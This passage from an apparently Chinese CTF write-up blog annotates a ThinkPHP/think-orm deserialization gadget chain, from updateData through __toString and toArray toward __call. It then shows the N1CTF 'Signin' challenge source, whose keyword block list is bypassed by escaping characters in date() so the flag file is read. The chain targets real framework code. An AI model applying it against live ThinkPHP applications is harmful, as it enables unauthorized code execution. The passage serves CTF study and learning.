<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此处构造withEvent为false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入updateData()函数</span></span><br><span class="line">    <span class="comment">// vendor/topthink/think-orm/src/Model.php</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 事件回调</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取有更新的数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="comment">// 关联更新</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">            <span class="comment">// 自动写入更新时间</span></span><br><span class="line">            <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoWriteTimestamp</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;updateTime] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTimestampValue</span>(<span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查允许字段</span></span><br><span class="line">        <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>();   <span class="comment">// 下一个入口</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;relationWrite <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模型更新</span></span><br><span class="line">        <span class="variable">$db</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">transaction</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$data</span>, <span class="variable">$allowFields</span>, <span class="variable">$db</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="literal">null</span>;</span><br><span class="line">            <span class="variable">$where</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getWhere</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">strict</span>(<span class="literal">false</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">cache</span>(<span class="literal">true</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">setOption</span>(<span class="string">&#x27;key&#x27;</span>, <span class="variable language_">$this</span>-&gt;key)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">field</span>(<span class="variable">$allowFields</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkResult</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关联更新</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新回调</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;AfterUpdate&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 前提</span></span><br><span class="line">    <span class="comment">// trigger返回true  前面构造已经达成</span></span><br><span class="line">    <span class="comment">// empty($data)返回为false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// $data的赋值是getChangedData()返回值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable language_">$this</span>-&gt;data, <span class="variable language_">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$field</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="variable">$field</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造$force为true使data返回为空数组</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入checkAllowFields()函数</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测字段</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;field = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable language_">$this</span>-&gt;schema, <span class="variable language_">$this</span>-&gt;jsonType));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line">                <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;table ? <span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix : <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getTable</span>();</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;field = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getConnection</span>()-&gt;<span class="title function_ invoke__">getTableFields</span>(<span class="variable">$table</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;field;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$field</span> = <span class="variable language_">$this</span>-&gt;field;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$field</span>, <span class="variable language_">$this</span>-&gt;createTime, <span class="variable language_">$this</span>-&gt;updateTime);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;disuse)) &#123;</span><br><span class="line">            <span class="comment">// 废弃字段</span></span><br><span class="line">            <span class="variable">$field</span> = <span class="title function_ invoke__">array_diff</span>(<span class="variable">$field</span>, <span class="variable language_">$this</span>-&gt;disuse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$field</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 由于条件默认值即是成立的，因此直接进入db函数，这是网上找的链子，但前面的updataData，在checkAllowFields函数下面一句就是db函数，写完这条再看吧</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable language_">$this</span>-&gt;connection)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">name</span>(<span class="variable language_">$this</span>-&gt;name . <span class="variable language_">$this</span>-&gt;suffix)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable language_">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;table)) &#123;</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="variable language_">$this</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">json</span>(<span class="variable language_">$this</span>-&gt;json, <span class="variable language_">$this</span>-&gt;jsonAssoc)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">setFieldType</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable language_">$this</span>-&gt;schema, <span class="variable language_">$this</span>-&gt;jsonType));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 软删除</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable language_">$this</span>, <span class="string">&#x27;withTrashed&#x27;</span>) &amp;&amp; !<span class="variable language_">$this</span>-&gt;withTrashed) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">withNoTrashed</span>(<span class="variable">$query</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 全局作用域</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$scope</span>)) &#123;</span><br><span class="line">            <span class="variable">$globalScope</span> = <span class="title function_ invoke__">array_diff</span>(<span class="variable language_">$this</span>-&gt;globalScope, <span class="variable">$scope</span>);</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">scope</span>(<span class="variable">$globalScope</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回当前模型的数据库查询对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$query</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里db函数中出现了字符串拼接，就可以控制变量对魔术方法__toString触发</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里利用到的是vendor/topthink/think-orm/src/think/model/concern/Conversion.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跟进toJson()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跟进toArray</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    [<span class="variable">$relation</span>, <span class="variable">$name</span>]          = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    [<span class="variable">$relation</span>, <span class="variable">$name</span>]         = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable language_">$this</span>-&gt;data, <span class="variable language_">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;mapping[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="comment">// 检查字段映射</span></span><br><span class="line">                <span class="variable">$mapName</span>        = <span class="variable language_">$this</span>-&gt;mapping[<span class="variable">$key</span>];</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$mapName</span>] = <span class="variable">$item</span>[<span class="variable">$key</span>];</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$item</span>[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">appendAttrToArray</span>(<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;convertNameToCamel) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$item</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                <span class="variable">$name</span> = <span class="title class_">Str</span>::<span class="title function_ invoke__">camel</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$name</span> !== <span class="variable">$key</span>) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$val</span>;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="variable">$item</span>[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跟进appendAttrToArray</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">appendAttrToArray</span>(<span class="params"><span class="keyword">array</span> &amp;<span class="variable">$item</span>, <span class="variable">$key</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)</span><br><span class="line">                -&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            [<span class="variable">$key</span>, <span class="variable">$attr</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])</span><br><span class="line">                -&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span>       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getBindAttrValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 利用$relation-&gt;append()触发一个，魔术方法__call()\</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h1 id="N1ctf"><a href="#N1ctf" class="headerlink" title="N1ctf"></a>N1ctf</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag is /flag</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span>=(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;time&#x27;</span>])) ? <span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">date</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))) : <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y/m/d H:i:s&quot;</span>);</span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;/var/www/tmp/&quot;</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$black</span>=<span class="string">&quot;f|ht|ba|z|ro|;|,|=|c|g|da|_&quot;</span>;</span><br><span class="line"><span class="variable">$blist</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$black</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$blist</span> <span class="keyword">as</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$path</span>,<span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$name</span>, <span class="variable">$time</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;logpath:<span class="subst">$name</span>&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$check</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$check</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre class=&#x27;language-html&#x27;&gt;&lt;code class=&#x27;language-html&#x27;&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$check</span>).<span class="string">&quot;&lt;/code&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过time可以让写入内容变得可控，直接输入会被解析成时间，可以使用反斜杠转义，传入get参数time的同时POST部分传入一个<code>/\f\l\a\g</code></p>
